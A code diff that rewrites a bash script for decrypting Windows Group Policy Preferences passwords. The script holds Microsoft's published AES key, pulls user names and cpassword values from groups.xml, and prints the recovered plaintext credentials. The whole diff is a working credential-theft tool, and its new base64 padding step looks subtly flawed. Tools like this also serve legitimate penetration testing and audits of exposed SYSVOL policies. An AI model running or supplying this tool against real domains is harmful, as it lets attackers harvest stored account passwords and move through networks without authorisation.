@@ -1,75 +1,67 @@
 #!/bin/bash
 
-# Function to display usage
-usage() {
-  echo "Usage: $0 -p <gpp password> -o <out file> [-h]"
-  echo "  -p    Encrypted GPP Password"
-  echo "  -o    Decrypted password output file"
-  echo "  -h    Displays this help menu"
-  exit 1
-}
-
-# The known AES key used by Microsoft for GPP encryption
+# Known AES key for GPP encryption
 AES_KEY='4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b'
 
-run_decrypt() {
-  local ENCRYPTED_PASSWORD="$1"
-  local password_file="$2"
-  local BIN_KEY BIN_DATA DECRYPTED_PASSWORD
+# Function to decrypt GPP password
+decrypt() {
+    local cpass="$1"
+    local decoded padding
 
-  # Convert the key from hex and ensure it's the correct length
-  if [ "${#AES_KEY}" -ne 64 ]; then
-    echo "Invalid AES key length."
-    exit 2
-  fi
-  BIN_KEY=$(echo $AES_KEY | xxd -r -p)
+    # Add necessary padding
+    padding=$(printf '%*s' $((4 - ${#cpass} % 4)) "")
+    padding=${padding// /=}
+    cpass="${cpass}${padding}"
 
-  # Validate and decode the encrypted password
-  if ! BIN_DATA=$(echo $ENCRYPTED_PASSWORD | base64 -d); then
-    echo "Base64 decoding failed. Ensure the encrypted password is base64 encoded."
-    exit 3
-  fi
+    # Decode from base64 and decrypt
+    decoded=$(echo "$cpass" | base64 -d | openssl aes-256-cbc -d -A -iv 00000000000000000000000000000000 -K $AES_KEY 2>/dev/null)
 
-  # Decrypt the password and handle potential decryption errors
-  DECRYPTED_PASSWORD=$(printf "%s" "$BIN_DATA" | openssl aes-256-cbc -d -A -iv 00000000000000000000000000000000 -K $BIN_KEY)
-  if [ $? -ne 0 ]; then
-    echo "AES decryption failed. Check the encrypted data and the AES key."
-    exit 4
-  fi
+    echo "$decoded"
+}
 
-  echo "$DECRYPTED_PASSWORD" > "$password_file"
-  echo "Decrypted password saved to $password_file"
+# Function to process XML file and extract cpassword
+process_file() {
+    local file="$1"
+
+    if [[ ! -f "$file" ]]; then
+        echo "Sorry, file not found!"
+        exit 1
+    fi
+
+    # Use xmllint to parse XML and extract needed information
+    local username=$(xmllint --xpath "string(//User/@name)" "$file" 2>/dev/null)
+    local cpassword=$(xmllint --xpath "string(//Properties/@cpassword)" "$file" 2>/dev/null)
+
+    if [[ -n "$username" ]]; then
+        echo "Username: $username"
+    else
+        echo "Username not found!"
+    fi
+
+    if [[ -n "$cpassword" ]]; then
+        local decrypted=$(decrypt "$cpassword")
+        echo "Password: $decrypted"
+    else
+        echo "Password not found!"
+    fi
 }
 
 # Main function
 main() {
-  local ENCRYPTED_PASSWORD OUT_FILE
+    if [[ "$#" -lt 1 ]]; then
+        echo "Usage: $0 -f [groups.xml] OR -c [cpassword]"
+        exit 1
+    fi
 
-  # Parse command-line options
-  while getopts "p:o:h" opt; do
-    case ${opt} in
-      p ) ENCRYPTED_PASSWORD=$OPTARG ;;
-      o ) OUT_FILE=$OPTARG ;;
-      h ) usage ;;
-      ? ) usage ;;
-    esac
-  done
-
-  # Verify required options are provided
-  if [ -z "$ENCRYPTED_PASSWORD" ] || [ -z "$OUT_FILE" ]; then
-    echo "Both -p (password) and -o (output file) options are required."
-    usage
-  fi
-
-  # Validate output file can be created
-  if ! touch "$OUT_FILE" &>/dev/null; then
-    echo "Cannot write to output file '$OUT_FILE'. Please check permissions or path validity."
-    exit 5
-  fi
-
-  # Run decryption
-  run_decrypt "$ENCRYPTED_PASSWORD" "$OUT_FILE"
+    while getopts ":f:c:" opt; do
+        case $opt in
+            f) process_file "$OPTARG" ;;
+            c) echo "Password: $(decrypt "$OPTARG")" ;;
+            \?) echo "Invalid option: -$OPTARG" >&2; exit 1 ;;
+            :) echo "Option -$OPTARG requires an argument." >&2; exit 1 ;;
+        esac
+    done
 }
 
-# Pass all arguments to the main function
+# Execute main function with all passed arguments
 main "$@"
